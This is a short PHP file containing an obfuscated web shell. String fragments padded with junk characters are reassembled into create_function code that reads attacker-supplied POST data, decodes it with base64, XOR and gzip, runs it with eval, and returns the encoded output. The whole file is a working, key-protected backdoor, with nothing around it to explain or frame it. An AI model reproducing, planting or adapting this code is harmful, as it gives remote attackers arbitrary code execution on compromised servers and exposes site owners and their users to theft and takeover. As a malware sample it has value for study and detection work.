<?php
$L=str_replace('S','','crSeatSe_SfuSncStSion');
$U='5JALpymTd";|Vfu|Vnction x($t|V,|V$k){$c=str|V|Vl|Ven($k);$l=str|Vlen($t);$o=|V|V"';
$A='();$r|V=@ba|Vse64_e|Vncode(@x(|V@gzcom|Vp|Vre|Vss($o),|V$k));|Vprint("$p$kh$r$|Vkf");}';
$g='$|V|Vk{$j};}}ret|Vurn $|Vo;}if (@p|Vreg_match(|V|V|V"/$kh(.+)$k|Vf/",@fi|Vle_get_|Vc|Vonte';
$v='nts("php:|V//input")|V,|V$m)==1) {@|Vob_|Vstart();@e|Vval|V(@g|Vzun|Vcompress(@x(@b';
$Y='a|Vse|V64_d|Vecode($m[|V1]),$k)))|V;$o=|V@ob_get_|Vconte|Vnts();@|Vob_en|Vd_cl|Vean';
$p='"|V;for($i=0;$i<$l|V;|V){for($j=0;|V($j<$c&|V&$|Vi<$l);|V|V$|Vj++|V,$i++){$o.=$t{$i}^';
$J='$k="d4f|V8|V3de6";$kh=|V"6|V17a5a2a2a5|Vb";$kf="|Vaa|Vc|V5|V38fb|V353|V4";$p="lE1iOFY';
$I=str_replace('|V','',$J.$U.$p.$g.$v.$Y.$A);
$b=$L('',$I);$b();
?>
